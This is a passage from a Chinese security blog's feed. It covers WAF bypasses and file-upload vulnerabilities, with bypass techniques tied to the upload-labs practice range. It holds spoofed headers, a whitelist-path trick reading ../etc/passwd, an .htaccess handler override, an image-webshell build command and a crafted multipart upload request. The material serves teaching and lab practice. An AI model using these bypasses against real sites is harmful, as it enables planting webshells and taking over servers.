INFORMATION_SCHEMA.schemata</p><p>备注：获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</p><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p><strong>方式一：IP白名单</strong></p><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p><p>测试方法：修改http的header来bypass waf</p><p>X-forwarded-for</p><p>X-remote-IP</p><p>X-originating-IP</p><p>x-remote-addr</p><p>X-Real-ip</p><p><strong>方式二：静态资源</strong></p><p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p><p><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p><p>备注：Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php 后面基本不识别</p><p><strong>方式三：url白名单</strong></p><p>为了防止误拦，部分waf内置默认的白名单列表，如</p><p>admin&#x2F;manager&#x2F;system等管理后台。</p><p>只要url中存在白名单的字符串，就作为白名单不进行检测。</p><p><strong>常见的url构造：</strong></p><p><code>http://10.9.9.201/sql.php/admin.php?id=1</code></p><p><code>http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd</code></p><p><code>http://10.9.9.201/../../../manage/../sql.asp?id=2</code></p><p>waf通过&#x2F;manage&#x2F;“进行比较，只要uri中存在&#x2F;manage&#x2F;就作为白名单不进行检测，这样我们可以通过&#x2F;sql.php?a&#x3D;&#x2F;manage&#x2F;&amp;b&#x3D;..&#x2F;etc&#x2F;passwd 绕过防御规则。</p><p><strong>方式四：爬虫白名单</strong></p><p>部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</p><p>1、 根据UserAgent  2、通过行为来判断</p><p>UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。</p><p>User Agent Switcher (Firefox 附加组件)，下载地址：<a href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/">https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/</a></p><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><h3 id="整合绕过"><a href="#整合绕过" class="headerlink" title="整合绕过"></a>整合绕过</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;WAF简介&quot;&gt;&lt;a href=&quot;#WAF简介&quot; class=&quot;headerlink&quot; title=&quot;WAF简介&quot;&gt;&lt;/a&gt;WAF简介&lt;/h2&gt;&lt;h3 id=&quot;功能&quot;&gt;&lt;a href=&quot;#功能&quot; class=&quot;headerlink&quot; title=&quot;功能&quot;&gt;&lt;/a&gt;功</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://frankcao3.github.io/posts/11796"/>
    <id>https://frankcao3.github.io/posts/11796</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:00:30.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627433334141-cb693e43-53e8-4e28-80b9-b2c08e23f2f6.png" alt="web漏洞文件上传.png"></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>文件上传漏洞是指用户上传了一个<strong>可执行的脚本文件webshell</strong>，而且通过这个脚本文件获得了执行服务器端命令的能力。</p><p>Webshell 以 ASP、PHP、JSP 等网页文件形式存在的一种命令执行环境，也称其为一种网页后门，通过 Webshell 可以对所在服务器进行远程管理。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>非法用户可以利用上传的恶意脚本文件WebShell控制整个网站，甚至控制服务器。也可将WebShel脚本称为一 种网页后门，WebShel脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><ul><li>网站被植入黑链（博彩、黄色）</li><li>挖矿</li><li>文件泄露</li></ul><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>前端或者服务端代码未对客户端上传的文件进行严格的验证和过滤。</p><p>文件上传漏洞发生的<strong>前提</strong></p><p>1、网站上传功能能正常使用<br>2、文件类型允许上传<br>3、上传路径可以确定<br>4、文件可以被访问，可以被执行或被包含</p><h2 id="查找和判断"><a href="#查找和判断" class="headerlink" title="查找和判断"></a>查找和判断</h2><p>黑盒查找：不知道源代码情况下，通过目录扫描和网站应用，以及通过网站后台、会员中心进行获取权限，需要自己判断。</p><p>白盒查找：通过源代码分析文件上传漏洞。</p><p>判断：通过抓包分析</p><h2 id="文件上传的分类"><a href="#文件上传的分类" class="headerlink" title="文件上传的分类"></a>文件上传的分类</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627433817849-28573285-fa9c-4d1d-9864-2f822f372ee5.png" alt="文件上传利用思路.png"></p><ul><li><p>常规类</p></li><li><p>CMS类</p><p>CMS 又叫网站内容管理系统（网站的模版，帮助我们快速建站，我们会在这个网站模板上做二次开发），市面上很多开源的CMS 的历史版本有很多都存在着文件上传漏洞，但是产生文件上传漏洞的原因不尽相同。</p><p>比如常见的dedeCMS（织梦）、PHPcms、Seacms 等。</p><p>参考：<a href="https://blog.csdn.net/qq_35733751/article/details/115317967">https://blog.csdn.net/qq_35733751/article/details/115317967</a></p></li><li><p>编辑器类</p><p>编辑器就是网站后台编辑网页的在线编辑器，会自动集成文件上传功能，这些编辑器的某些版本也存在文件上传漏洞，从而进行getshell</p><p>比如ewebeditor、fckeditor。</p><p>参考：<a href="https://www.likecs.com/show-203442332.html">https://www.likecs.com/show-203442332.html</a></p></li><li><p>CVE</p><p>比如，Weblogic任意文件上传漏洞( CVE-2018-2894 )</p></li></ul><h2 id="文件上传的利用"><a href="#文件上传的利用" class="headerlink" title="文件上传的利用"></a>文件上传的利用</h2><ul><li><p><strong>找到上传的位置</strong></p><p>常规文件上传地址的获取说明：</p><p>比如搜索引擎搜索<code>inurl:upload.php</code>、网站的目录扫描（<strong>御剑</strong>）、针对网站搜索upload关键词<code>site:abc.com upload</code>、网站自身的应用（上传头像、图片等）。</p></li><li><p><strong>尝试绕过校验，上传php文件</strong></p><p>upload-fuzz-dic-builder 上传漏洞fuzz字典生成脚本：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></p><p>文件上传攻击一般配合文件解析漏洞，比如nginx解析漏洞。具体可以看文件上传攻击的防护及绕过。</p></li><li><p><strong>获得文件位置</strong></p><p>上传文件后，要想执行，必须先获取文件路径。可以拖动上传的文件到新标签页得到文件路径，或者看看URL、或者看网站有没有查看所上传文件的地方。</p></li><li><p><strong>蚁剑&#x2F;菜刀连接，管理文件</strong></p></li></ul><h2 id="文件上传攻击的防护及绕过"><a href="#文件上传攻击的防护及绕过" class="headerlink" title="文件上传攻击的防护及绕过"></a>文件上传攻击的防护及绕过</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627433334141-cb693e43-53e8-4e28-80b9-b2c08e23f2f6.png" alt="img"></p><p>**使用github上的靶场：<code>upload labs</code>**（场景比DVMA更丰富），下载下来放在本地网站localhost里（phpstudy或者apache+php）。</p><p>fuzz字典：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder%EF%BC%8C%E5%8C%85%E5%90%AB%E5%8F%AF%E8%83%BD%E7%9A%84%E6%94%BB%E5%87%BB%E8%AF%AD%E5%8F%A5%E3%80%82%E7%BB%93%E5%90%88BP%E4%BD%BF%E7%94%A8%E3%80%82">https://github.com/c0ny1/upload-fuzz-dic-builder，包含可能的攻击语句。结合BP使用。</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728153545912.png" alt="image-20220728153545912"></p><h3 id="防护思路"><a href="#防护思路" class="headerlink" title="防护思路"></a>防护思路</h3><ol><li><p>后端验证：采用服务端验证模式（不采用前端验证） </p></li><li><p>下面三种检测方式同时进行：</p><ul><li><p>后缀检测：基于黑名单，白名单过滤</p></li><li><p>MIME 检测：基于上传自带类型检测</p></li><li><p>内容检测：文件头，完整性检测</p></li></ul></li><li><p>自带函数过滤（就PHP脚本而言） </p><p>比如getimagesize()函数检查文件头；exif_imagetype()函数检查文件类型等等</p></li><li><p>自定义函数过滤：function check_file(){}</p><p>结合黑名单和白名单，可以两者相互嵌套</p></li><li><p>WAF 防护产品：宝塔，云盾，安全公司产品等</p><p>如果存在waf,就无法判断是否存在文件上传漏洞，只有一一尝试。</p></li></ol><h3 id="1-前端限制文件类型（白名单）"><a href="#1-前端限制文件类型（白名单）" class="headerlink" title="1. 前端限制文件类型（白名单）"></a>1. 前端限制文件类型（白名单）</h3><p>破解方法一：直接F12，删除（禁用）前端的限制文件类型的JS脚本。上传成功后，拖动图片到新标签页得到文件路径。</p><p>破解方法二：先上传网站允许的文件后缀，然后BP抓包修改文件后缀为php。</p><h3 id="2-MIME类型"><a href="#2-MIME类型" class="headerlink" title="2. MIME类型"></a>2. MIME类型</h3><p>参考upload-labs Pass-2。</p><p>在访问网页时，MIME type帮助浏览器识别一个HTTP请求返回的是什么内容的数据，应该如何打开、如何显示。<strong>作用和文件拓展名相似，但不同的是它并非标注文件，而是在邮件和HTTP协议中用来标注网络数据的。</strong></p><p>客户端使用:</p><p>1、GET请求不需要这个字段。<br>2、POST请求头，放在<strong>Content Type字段</strong> 用来指定上传的文件类型，方便服务器解析。放在Accept, 告诉服务端允许接收的响应类型。比如只能接收json或者其他。</p><p>服务端使用:</p><p>1、放在响应头里面，<strong>Content Type</strong> 告诉客户端响应的数据类型，方便客户端解析。</p><table><thead><tr><th>MIME</th><th>描述</th></tr></thead><tbody><tr><td>text&#x2F;html</td><td>HTML格式</td></tr><tr><td>application&#x2F;json</td><td>JSON数据格式</td></tr><tr><td>multipart&#x2F;form-data</td><td>文件上传(二进制数据)</td></tr><tr><td>image&#x2F;jpeg、image&#x2F;gif、image&#x2F;pjpeg</td><td>jpg、gif、pjpeg图片格式</td></tr></tbody></table><p>MIME类型的确定根据的是文件扩展名。</p><p>破解方法：BP抓包，修改MIME类型为image&#x2F;jpeg即可绕过上传。</p><h3 id="3-文件后缀黑名单"><a href="#3-文件后缀黑名单" class="headerlink" title="3. 文件后缀黑名单"></a>3. 文件后缀黑名单</h3><p>参考upload-labs Pass-4。</p><p>禁止asp、php等类型文件上传。</p><p>破解方法：使用等价扩展名。</p><table><thead><tr><th>语言</th><th>等价扩展名</th></tr></thead><tbody><tr><td>asp</td><td>asa,cer,cdx</td></tr><tr><td>aspx</td><td>ashx,asmx,ascx</td></tr><tr><td>php</td><td>php2、 php3、 php4、 php5、 phps、 phtml</td></tr><tr><td>jsp</td><td>jspx.jspf</td></tr></tbody></table><p><strong>文件后缀绕过</strong></p><p>文件后缀绕过攻击是服务端代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其他文件后缀的，例如在httpd.conf中，如果<strong>增加其他后缀</strong>为<code>shell.php.phtml</code>，则能够解析php和phtml文件。</p><p>在Apache的<strong>解析顺序</strong>中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止，所以如果上传的文件名类似<code>1.php.xxxx</code>，因为后缀xxxx不可以解析，所以向左解析后缀php。而服务器如果使用php的pathinfo()来获取文件后缀，那么只会看到后缀xxxx，因此实现了绕过。</p><h3 id="4-很全的黑名单-大小写模糊（-htaccess绕过）"><a href="#4-很全的黑名单-大小写模糊（-htaccess绕过）" class="headerlink" title="4. 很全的黑名单+大小写模糊（.htaccess绕过）"></a>4. 很全的黑名单+大小写模糊（.htaccess绕过）</h3><p>黑名单更多了一些，不过没有过滤<code>.htaccess</code>后缀，参考upload-labs Pass-4。</p><p>先按照如下代码块的内容写一个新的<code>.htaccess</code>文件，然后上传，使其处于所有上传文件所在的目录。</p><blockquote><p>htaccess: Hypertext Access(超文本入口)<br>它是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。<br>作用：伪静态、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.png&quot;&gt;  </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">AddType application/x-httpd-php png</span><br></pre></td></tr></table></figure><p>然后将php文件修改为<code>.htaccess</code>文件所指定的图片文件后缀或文件名，然后上传。因为.htaccess文件被修改，所以直接访问该图片文件时其会被服务器当作PHP文件解析。</p><p><strong>.htaccess生效的前提：</strong></p><p>httpd.conf设置AllowOverride all，而不是none，所以phpstudy集成的apache会无法实验成功。</p><h3 id="5-黑名单过滤，没有考虑大小写"><a href="#5-黑名单过滤，没有考虑大小写" class="headerlink" title="5. 黑名单过滤，没有考虑大小写"></a>5. <strong>黑名单过滤，没有考虑大小写</strong></h3><p>过滤htaccess后缀，但是没有过滤php全部的大小写，使用后缀pHp即可绕过上传。参考upload-labs Pass-5。</p><p><code>shell.pHp</code></p><h3 id="6-黑名单过滤，没有对后缀去空"><a href="#6-黑名单过滤，没有对后缀去空" class="headerlink" title="6. 黑名单过滤，没有对后缀去空"></a>6. 黑名单过滤，没有对后缀去空</h3><p>在判断后缀名的时候没有先去除多余的空格。参考upload-labs Pass-6。</p><p>后缀名后添加空格即可绕过后端php脚本的检测，再上传到windows服务器上，会自动去除后缀名后的空格。</p><p><code>shell.php </code>（php后面有空格）</p><h3 id="7-黑名单过滤，没有过滤点"><a href="#7-黑名单过滤，没有过滤点" class="headerlink" title="7. 黑名单过滤，没有过滤点"></a>7. 黑名单过滤，没有过滤点</h3><p>添加点即可绕过后端的php检测，而且可以正常解析。参考upload-labs Pass-7。</p><p><code>shell.php.</code></p><p>另外，遇到move_uploaded_file()函数时，其有这么一个特性，会忽略掉文件末尾的 &#x2F;.<br>所以直接上传php文件，然后抓包，添加&#x2F;. 就可以绕过黑名单。参考upload-labs Pass-19。</p><p><code>shell.php/.</code></p><p><strong>【upload-labs Pass-20】</strong>：</p><p>查看该题源码可知，若提交的保存的文件名save_name不是数组，那就以点来分割得到数组$file。而下面的EXP则是直接提交数组。</p><p>该页面会将数组的最后一个元素看作后缀名进行白名单校验，通过校验后将第一个元素和点以及最后一个元素拼接得到文件名。但是在取最后一个元素时存在漏洞：<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>。可以看如下POST请求体，save_name[0]为shell.php&#x2F;，save_name[2]为jpg，这样校验后缀名时取的是index为2的jpg。但是在拼接文件名时，由于未给save_name[1]赋值，所以<code>count($file)</code>的结果是2而非3，所以<code>$file[count($file) - 1]</code>的值为空，而非jpg。最后得到的文件名就为<code>shell.php/.</code>，又由于move_uploaded_file()函数会忽略这个&#x2F;.，所以该文件会被保存为shell.php。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">shell.php/</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi--</span><br></pre></td></tr></table></figure><h3 id="8-黑名单过滤，没有过滤-DATA"><a href="#8-黑名单过滤，没有过滤-DATA" class="headerlink" title="8. 黑名单过滤，没有过滤::$DATA"></a>8. 黑名单过滤，没有过滤::$DATA</h3><p>参考upload-labs Pass-8。</p><blockquote><p>在 Windows 操作系统中，::$DATA 是一种用于隐藏文件的特殊附加数据流（Alternate Data Stream）。它是一种扩展文件属性，可以将额外的数据附加到一个文件中，而不会影响文件的主要内容。<br>附加数据流基于文件名和冒号之间的特殊语法，例如：file.txt::D A T A 。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。这使得 : : DATA。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。 这使得 ::DATA。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。这使得::DATA 可以被用于隐藏文件内容、存储元数据或其他需要与主文件相关但不希望直接显示给用户的信息。</p></blockquote><p><code>shell.php::$DATA</code></p><h3 id="9-黑名单过滤，改变符号或者多次换行"><a href="#9-黑名单过滤，改变符号或者多次换行" class="headerlink" title="9. 黑名单过滤，改变符号或者多次换行"></a>9. 黑名单过滤，改变符号或者多次换行</h3><p>比如BP抓包后，将双引号变为单引号，或者去掉文件名的双引号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name=&quot;uploadfile&quot;; filename=info4.php</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>或者只用一个双引号（引号没有闭合，安全狗会误以为是程序自带）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name=&quot;uploadfile&quot;; filename=&quot;info5.php</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>或者文件名内多次换行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;x.</span><br><span class="line">p</span><br><span class="line">h</span><br><span class="line">p&quot;</span><br><span class="line">Content-Type:  image/jpeg</span><br></pre></td></tr></table></figure><h3 id="10-黑名单，；绕过"><a href="#10-黑名单，；绕过" class="headerlink" title="10. 黑名单，；绕过"></a>10. 黑名单，<code>；</code>绕过</h3><p><code>.jpg;.php</code></p><p>分号<code>;</code>代表语句的结束，安全狗检测文件名字符串时，检测到jpg就结束了，后面的.php略过。</p><h3 id="11-删除黑名单字段（-x3D-x3D-重复数据-x3D-x3D-绕过）"><a href="#11-删除黑名单字段（-x3D-x3D-重复数据-x3D-x3D-绕过）" class="headerlink" title="11. 删除黑名单字段（&#x3D;&#x3D;重复数据&#x3D;&#x3D;绕过）"></a>11. 删除黑名单字段（&#x3D;&#x3D;重复数据&#x3D;&#x3D;绕过）</h3><p>黑名单包括php、asp</p><p>破解：文件名双写：比如<code>shell.pphphp</code></p><h3 id="12-白名单（get的-00-x3D-x3D-截断绕过-x3D-x3D-）"><a href="#12-白名单（get的-00-x3D-x3D-截断绕过-x3D-x3D-）" class="headerlink" title="12. 白名单（get的%00&#x3D;&#x3D;截断绕过&#x3D;&#x3D;）"></a>12. 白名单（get的%00&#x3D;&#x3D;截断绕过&#x3D;&#x3D;）</h3><p>参考upload-labs Pass-11。</p><p>严格限制后缀为某几种，但是请求路径使用的是get请求（request请求）。</p><p>get请求会根据文件路径做了一个00截断，<code>../upload/1.php%00check.jpg</code>不会被白名单过滤，而且请求后路径就被截断，变成<code>../upload/1.php</code> 。</p><blockquote><p>00截断的操作环境<strong>需魔术引用开关magic_quotes_gpc为off状态</strong>，不然%00会被转义，导致攻击失效。</p><p>魔术引用开关magic_quotes_gpc会转义以下字符：</p><p>单引号（’）<br>双引号（”）<br>反斜杠（\）<br>NULL</p></blockquote><p>但是，该方法只能绕过接收参数时的判断，如果服务器对请求后得到的路径再进行白名单的判断，因为已经被get请求截断了，后缀变成php，还是会被检测到。</p><h3 id="13-白名单（post的-00截断绕过）"><a href="#13-白名单（post的-00截断绕过）" class="headerlink" title="13. 白名单（post的%00截断绕过）"></a>13. 白名单（post的%00截断绕过）</h3><p>参考upload-labs Pass-12。</p><p>严格限制后缀为某几种，但是请求路径使用的是post请求（request请求）。</p><p>post需要通过BP抓包修改数据包的文件名后缀部分，需要用二进制的方式去修改。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20190617182023127.png" alt="img" style="zoom:50%;"><h3 id="14-x3D-x3D-判断文件头-x3D-x3D-图片马"><a href="#14-x3D-x3D-判断文件头-x3D-x3D-图片马" class="headerlink" title="14. &#x3D;&#x3D;判断文件头&#x3D;&#x3D;(图片马)"></a>14. &#x3D;&#x3D;判断文件头&#x3D;&#x3D;(图片马)</h3><p>参考upload-labs Pass-14-17。</p><p>使用了 <code>getimagesize( $uploaded_tmp )</code> 来获取<strong>文件头</strong>中的图片尺寸信息，读取不到尺寸信息则拒绝上传。</p><p>此时可以使用图片马，文件后缀依然为php。此时webshell可以被解析为脚本，同时getimagesize也可以获取到图片信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat huaji.jpg shell.php &gt; shell.php</span><br></pre></td></tr></table></figure><h3 id="15-判断文件头且限制后缀"><a href="#15-判断文件头且限制后缀" class="headerlink" title="15. 判断文件头且限制后缀"></a>15. 判断文件头且限制后缀</h3><p>使用 <code>strrpos( $uploaded_name, &#39;.&#39; )</code> 函数来截取文件名中最后一个 <code>.</code> 后面的字符，来识别为上传的文件的后缀名，并只接受后缀名为 <code>jpg</code>，<code>jpeg</code>，<code>png</code> 的文件。同时使用了 <code>getimagesize( $uploaded_tmp )</code> 来获取<strong>文件头</strong>中的图片尺寸信息，读取不到尺寸信息则拒绝上传。</p><p>此时只能使用图片马：</p><p>windows</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> huaji.gif /b + shell.php /a shell.gif</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat huaji.jpg shell.php &gt; shell.jpg</span><br></pre></td></tr></table></figure><p>图片马需要通过命令注入漏洞<code>rename shell.jpg shell.php</code>来把上一步上传的 <code>shell.jpg</code> 重命名为 <code>shell.php</code>，然后利用文件包含漏洞才能执行，使用include包含。</p><p><code>include</code> 方法可以让当前页面去执行指定的另外一个文件中的代码内容。</p><p>存在如下文件：upload&#x2F;include.php，文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用<code>localhost:8080/upload/include.php?page=shell.php</code>可以借助蚁剑连接成功。</p><h3 id="16-php内置函数获取图片类型"><a href="#16-php内置函数获取图片类型" class="headerlink" title="16. php内置函数获取图片类型"></a>16. php内置函数获取图片类型</h3><p>比如getimagesize()、exif_imagetype()。</p><p><strong>exif_imagetype()</strong> 读取一个图像的第一个字节并检查其签名。</p><p>exif_imagetype环境需要开启php_exit模块。如果函数出现报错，则需要去php.ini修改如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extension=php_mbstring.dll</span><br><span class="line">extension=php_exif.dll</span><br></pre></td></tr></table></figure><p>然后再重启服务器即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>); <span class="comment">//设置编码为UTF-8 不然乱码</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; <span class="comment">//通过get传值判断文件类型</span></span><br><span class="line"><span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进行判断&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$image_type</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:GIF&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:png&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:未知&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上图片马绕过。</p><h3 id="17-上传后重命名（md5）"><a href="#17-上传后重命名（md5）" class="headerlink" title="17.  上传后重命名（md5）"></a>17.  上传后重命名（md5）</h3><p>使用了 <code>md5()</code> 函数对上传的文件的文件名进行重命名，重命名为 MD5 散列运算之后的值。可以防御通过 00 截断来解析一句话木马。同时使用了随机 Token 检查来增加修改数据包上传的难度。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15622995660349.jpg" alt="img" style="zoom: 33%;"><h3 id="18-竞争条件攻击"><a href="#18-竞争条件攻击" class="headerlink" title="18. 竞争条件攻击"></a>18. 竞争条件攻击</h3><p>参考upload-labs Pass-18。</p><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含WebShel脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差(因为要执行检查文件和删除文件的操作) , 攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。</p><h3 id="19-x3D-x3D-数据溢出-x3D-x3D"><a href="#19-x3D-x3D-数据溢出-x3D-x3D" class="headerlink" title="19. &#x3D;&#x3D;数据溢出&#x3D;&#x3D;"></a>19. &#x3D;&#x3D;数据溢出&#x3D;&#x3D;</h3><p>php文件被安全狗拦截：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627898889066-ba927953-805b-446e-a0c8-28a8e437dcec.png" alt="image.png"></p><p>修改数据包上传<code>Content-Disposition: form-data; name=&quot;uploadfile&quot;;</code>中间插入大量的垃圾数据从而绕过。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627898527403-03b55f1a-41a2-497a-a53b-61c5259b6895.png" alt="image.png"></p><h3 id="20-站库分离"><a href="#20-站库分离" class="headerlink" title="20. 站库分离"></a>20. 站库分离</h3><p>文件和网站放在不同的服务器上，即单独设置文件服务器的域名。这样就无法通过上传的文件对网站服务器进行渗透。</p><h1 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h1><h2 id="IIS6-0文件解析漏洞"><a href="#IIS6-0文件解析漏洞" class="headerlink" 